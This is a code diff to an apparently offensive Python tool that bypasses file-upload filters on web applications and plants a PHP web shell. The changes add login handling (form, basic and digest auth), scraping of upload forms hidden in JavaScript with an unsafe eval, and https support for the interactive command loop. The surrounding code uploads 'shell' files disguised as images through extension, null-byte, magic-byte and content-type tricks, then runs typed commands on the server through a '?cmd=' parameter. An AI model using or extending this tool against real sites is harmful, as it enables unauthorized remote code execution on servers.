@@ -14,6 +14,8 @@ import bs4 as bs
 import requests.cookies
 import pickle
 from requests_html import HTMLSession
+from requests.auth import HTTPDigestAuth
+from requests.auth import HTTPBasicAuth
 
 
 def save_cookies(session, filename):
@@ -39,50 +41,101 @@ def load_cookies(session, filename):
 def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
          password):
     try:
-        # Basic Authentication
-
-        print("[-] Trying to get HTML form elements and attribute for authentication, please wait!")
-        session = HTMLSession()
-        sauce = session.get(URL)
-        soup = bs.BeautifulSoup(sauce.html.html, "html.parser")
-        form = soup.find('form')
-
-        try:
-            submit_attr = form.find('input', type='submit').get('name')
-            username_attr = form.find('input', type='text').get('name')
-            password_attr = form.find('input', type='password').get('name')
-            data = {
-                f'{username_attr}': f'{username}',
-                f'{password_attr}': f'{password}',
-                f'{submit_attr}': f'submit'
-            }
-
-        except:
-            username_attr = form.find('input', type='text').get('name')
-            password_attr = form.find('input', type='password').get('name')
-            data = {
-                f'{username_attr}': f'{username}',
-                f'{password_attr}': f'{password}',
-                'submit': f'submit'
-            }
-
         session = requests.Session()
-        response = session.post(URL, allow_redirects=True)
-        session.post(response.url, data=data, allow_redirects=True)
-        save_cookies(session, "cookies.txt")
+        response = session.get(URL)
+        scraper = response.text
+        soup = bs.BeautifulSoup(scraper, "html.parser")
+        form = soup.find('body')
+        auth = str(form)
 
-        with open("cookie.txt", 'w') as f:
-            f.write(f"first, {session.cookies.get_dict()}")
+        if auth != "None":
 
-        load_cookies(session, "cookies.txt")
+            # Form authentication
+            session = HTMLSession()
+            sauce = session.get(URL)
+            soup = bs.BeautifulSoup(sauce.html.html, "html.parser")
+            form = soup.find('form')
 
-        if data == {}:
-            print("Server responded with an empty page!")
-            sys.exit(1)
+            try:
+                submit_attr = form.find('input', type='submit').get('name')
+                username_attr = form.find('input', type='text').get('name')
+                password_attr = form.find('input', type='password').get('name')
+                data = {
+                    f'{username_attr}': f'{username}',
+                    f'{password_attr}': f'{password}',
+                    f'{submit_attr}': f'submit'
+                }
+
+            except:
+                username_attr = form.find('input', type='text').get('name')
+                password_attr = form.find('input', type='password').get('name')
+                data = {
+                    f'{username_attr}': f'{username}',
+                    f'{password_attr}': f'{password}',
+                    'submit': f'submit'
+                }
+
+                if data == {}:
+                    print("Server responded with an empty page!")
+                    sys.exit(1)
+
+            response = session.post(URL, allow_redirects=True)
+            second_response = session.post(response.url, data=data, allow_redirects=True)
+
+            if second_response.url != response.url:
+
+                save_cookies(session, "cookies.txt")
+
+                with open("cookie.txt", 'w') as f:
+                    f.write(f"first, {session.cookies.get_dict()}")
+
+                load_cookies(session, "cookies.txt")
+                print("[*] Authentication worked!")
+                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                           location,
+                           session)
+
+            else:
+                print("[-] Username or password is incorrect!")
+                sys.exit(1)
 
         else:
-            attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
-                       session)
+
+            # Basic Authentication
+            basic = HTTPBasicAuth(username, password)
+            response = session.get(URL, auth=basic)
+            scraper = response.text
+            soup = bs.BeautifulSoup(scraper, "html.parser")
+            form = soup.find('body')
+            auth = str(form)
+
+            if auth != "None" and auth != "":
+                print("[*] Authentication worked!")
+                save_cookies(session, "cookies.txt")
+                load_cookies(session, "cookies.txt")
+                attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                           location,
+                           session)
+
+            else:
+                # Digest Authentication
+                response = requests.get(URL, auth=HTTPDigestAuth(username, password))
+                scraper = response.text
+                soup = bs.BeautifulSoup(scraper, "html.parser")
+                form = soup.find('body')
+                auth = str(form)
+
+                if auth != "None" and auth != "":
+                    print("[*] Authentication worked!")
+                    save_cookies(session, "cookies.txt")
+                    load_cookies(session, "cookies.txt")
+                    attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                               location,
+                               session)
+
+                else:
+                    print("[-] Username or password is incorrect!")
+                    sys.exit(1)
 
     except requests.exceptions.RequestException as error:
         raise SystemExit(error)
@@ -100,6 +153,7 @@ def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brut
     slicing = slicing.split(", ")
     data = {}
     file_attr = ""
+    form_check = ""
 
     start_name = 'name="'
     end_name = '"'
@@ -152,12 +206,119 @@ def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brut
                     attribute_dictionary = {"submit": "submit"}
                     data.update(attribute_dictionary)
 
+    if data != {}:
+        file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
+                       session, file_attr, data)
+    # Form scraper inside javascript tags
+    elif data == {}:
+
+        request = requests.get(URL)
+        response = request.text
+
+        soup = bs.BeautifulSoup(response, "html.parser")
+        form = soup.find('script')
+
+        temp = str(form)
+        new_form = temp.split("<")
+        form_check = str(new_form)
+
+    if '/form' in form_check:
+
+        hidden_dic = {}
+        submit_dic = {}
+
+        file_attr = ""
+        data = {}
+
+        start_name = 'name="'
+        end_name = '"'
+
+        start_value = 'value="'
+        end_value = '"'
+
+        submit_start = 'value="'
+        submit_end = '"'
+
+        action_start = 'action="'
+        action_end = '" '
+
+        attribute_dictionary = ""
+
+        name = ""
+        value = ""
+        submit = ""
+        action = ""
+        submit_value = ""
+
+        for i in new_form:
+
+            if 'hidden' in i:
+                hidden_attribute = str(i)
+                hidden_attribute = hidden_attribute.split(" ")
+
+                for j in hidden_attribute:
+
+                    if "name" in j:
+                        name = j[j.find(start_name) + len(start_name):j.rfind(end_name)]
+
+                    if "value" in j:
+                        value = j[j.find(submit_start) + len(submit_start):j.rfind(end_value)]
+
+                    if name != "" and value != "":
+                        attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + str(value) + '"' + "}"
+                        data = json.loads(attribute_dictionary)
+                        hidden_dic.update(data)
+                        name = ""
+                        value = ""
+
+            if 'file' in i:
+                file_attribute = str(i)
+                file_attribute = file_attribute.split(" ")
+
+                for k in file_attribute:
+
+                    if "name" in k:
+                        file_attr = k[k.find(start_name) + len(start_name):k.rfind(end_name)]
+
+            if 'submit' in i:
+                submit_value = i[i.find(submit_start) + len(submit_start):i.rfind(submit_end)]
+                submit_attributes = "{" + '"' + "submit" + '"' + ": " + '"' + str(submit_value) + '"' + "}"
+                data = json.loads(submit_attributes)
+                submit_dic.update(data)
+
+            if 'action' in i:
+                action_value = i[i.find(action_start) + len(action_start):i.rfind(action_end)]
+                action = action_value
+                action = action.replace("'", "").replace('"', "")
+
+                if " + " in action:
+                    action = action.replace(' + ', '" + "')
+                    action = '"' + action + '"'
+                    action = eval(action)
+                else:
+                    pass
+
+        data.update(submit_dic)
+        data.update(hidden_dic)
+
+        if action != "":
+            domain = urlparse(URL).netloc
+
+            if 'http://' in URL:
+                URL = "http://" + domain + action
+            else:
+                URL = "https://" + domain + action
+
+        else:
+            print("Couldn't upload files...")
+            sys.exit(1)
+
+    else:
+        print("Couldn't upload files...")
+        sys.exit(1)
+
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                    session, file_attr, data)
-
-    if data == {}:
-        print("Server responded with an empty page!")
-        sys.exit(1)
 
 
 def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
@@ -191,7 +352,7 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
             filename = f'shell.{EXTENSION}'
             filename_ext = filename.replace("shell.php", f"shell{ext}")
             files = {
-                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg')
             }
 
             response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
@@ -209,8 +370,15 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    if 'http://' in URL:
+                        print(
+                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    else:
+                        print(
+                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
+
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -221,7 +389,12 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                             command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            if 'http://' in URL:
+                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            else:
+                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
                                                    proxies=proxies, verify=TLS)
@@ -302,7 +475,15 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
 
                 print(f"[*] File uploaded successfully with: {filename_ext}")
                 domain = urlparse(URL).netloc
-                print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                if 'http://' in URL:
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                else:
+                    print(
+                        f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
+
                 print("[*] Saved in results.txt")
                 f = open("results.txt", "a")
                 f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -313,7 +494,11 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                         command = input("└─$ ")
                         cmd_encoded = urllib.parse.quote(command)
                         domain = urlparse(URL).netloc
-                        final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                        if 'http://' in URL:
+                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+                        else:
+                            final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                         response = session.get(final_url, headers=headers, data=data,
                                                proxies=proxies, verify=TLS)
@@ -390,8 +575,15 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    if 'http://' in URL:
+                        print(
+                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    else:
+                        print(
+                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
+
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -402,7 +594,11 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                             command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            if 'http://' in URL:
+                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+                            else:
+                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, allow_redirects=False, headers=headers,
                                                    proxies=proxies, verify=TLS)
@@ -497,8 +693,15 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    if 'http://' in URL:
+                        print(
+                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    else:
+                        print(
+                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
+
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -509,7 +712,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            if 'http://' in URL:
+                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+                            else:
+                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, headers=headers, allow_redirects=False,
                                                    proxies=proxies, verify=TLS)
@@ -562,8 +769,15 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    if 'http://' in URL:
+                        print(
+                            f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+
+                    else:
+                        print(
+                            f"[*] You can access the uploaded file on: https://{domain}{location}{filename_ext}?cmd=command")
+
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -574,7 +788,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            if 'http://' in URL:
+                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+                            else:
+                                final_url = f"https://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, headers=headers, allow_redirects=False,
                                                    proxies=proxies, verify=TLS)
@@ -637,8 +855,16 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
 
                     print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                     domain = urlparse(URL).netloc
-                    print(
-                        f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
+
+                    if 'http://' in URL:
+
+                        print(
+                            f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
+
+                    else:
+                        print(
+                            f"[*] You can access the uploaded file on: https://{domain}{location}shell.{EXTENSION}?cmd=command")
+
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.close()
@@ -648,7 +874,13 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                             command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
+
+                            if 'http://' in URL:
+
+                                final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
+
+                            else:
+                                final_url = f"https://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, allow_redirects=False, headers=headers, data=data,
                                                    proxies=proxies,
@@ -701,7 +933,7 @@ def main():
                       default="required_to_be_true")
 
     parser.add_option('-H', "--header", type="string", dest="header",
-                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes around the data and wrapp it all with single quotes. Use comma to separate multi headers.',
+                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
                       default="optional")
 
     parser.add_option('-l', "--location", type="string", dest="location",
@@ -777,7 +1009,10 @@ def main():
 
     else:
         headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.5"
         }
 
     positional_args = [URL, SUCCESS, EXTENSION, ALLOWED_EXT]
